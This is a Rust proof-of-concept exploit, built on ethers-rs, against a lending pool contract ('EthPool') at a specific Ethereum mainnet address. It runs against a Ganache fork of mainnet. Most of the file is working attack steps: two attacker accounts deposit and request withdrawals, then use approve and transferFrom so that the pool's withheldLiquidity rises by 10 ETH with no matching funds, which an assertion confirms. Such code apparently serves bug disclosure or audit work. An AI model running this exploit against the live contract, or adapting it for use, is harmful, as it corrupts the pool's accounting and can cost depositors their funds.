use anyhow::Result;
use std::{convert::TryFrom, env, sync::Arc, time::Duration};

use ethers::{
    prelude::*,
    utils::{format_ether, parse_ether, launch_ganache, Ganache, GanacheInstance},
};
use ethers::prelude::*;

mod bindings;
use bindings::eth_pool::EthPool;

const ETH_POOL: &'static str = "0xD3D13a578a53685B4ac36A1Bab31912D2B2A2F36";
const FORK_BLOCK: &'static str = "13098646";

#[tokio::main]
async fn main() -> Result<()> {

    // launch ganache
    let key = env::var("INFURA_API_KEY")?;
    let endpoint = [
        "https://mainnet.infura.io/v3/",
        key.as_str(),
        "@",
        FORK_BLOCK,
    ]
    .join("");
    let node: &GanacheInstance = &launch_ganache(Ganache::new().fork(endpoint)).await;

    // get provider and accounts
    let provider = Provider::<Http>::try_from(node.endpoint())?.interval(Duration::from_millis(1));
    let accts: Vec<LocalWallet> = node.keys()[..3]
        .iter()
        .map(|x| x.clone().into())
        .collect();
    let who = accts[0].clone();
    let client = Arc::new(SignerMiddleware::new(provider.clone(), who));

    // get pool
    let pool = EthPool::new(ETH_POOL.parse::<Address>()?, client);

    // get attacker addresses
    let con0 = accts[1].address();
    let con1 = accts[2].address();

    // --- Exploit ---

    // amount of funds to use for exploit, split between two accounts
    let amt = parse_ether(U256::from(10))?;
    let twice_amt = amt.checked_mul(2.into()).unwrap();

    // deposit and request withdrawal from two separate addresses
    pool.deposit(amt).from(con0).value(amt).send().await?;
    pool.deposit(amt).from(con1).value(amt).send().await?;
    pool.request_withdrawal(amt).from(con0).send().await?;
    pool.request_withdrawal(amt).from(con1).send().await?;

    // withheldLiquidity with all attacker funds withheld. We should
    // not be able to increase this without adding more funds.
    let wliq0 = pool.withheld_liquidity().call().await?;

    // transfer funds from con0 to con1, removing con0's requested withdrawal
    // amt, but leaving con1 with no funds and the original requested
    // withdrawal amt
    pool.approve(con0, U256::MAX).from(con1).send().await?;
    pool.transfer_from(con1, con0, amt).from(con0).send().await?;

    // request withdrawal of all funds from con0, increasing the total
    // withheldLiquidity without adding any more funds
    pool.request_withdrawal(twice_amt).from(con0).send().await?;

    let wliq1 = pool.withheld_liquidity().call().await?;

    // we've added 10 eth worth of withheld liquidity which does not exist.
    assert_eq!(wliq1, wliq0 + parse_ether(10)?);

    Ok(())
}
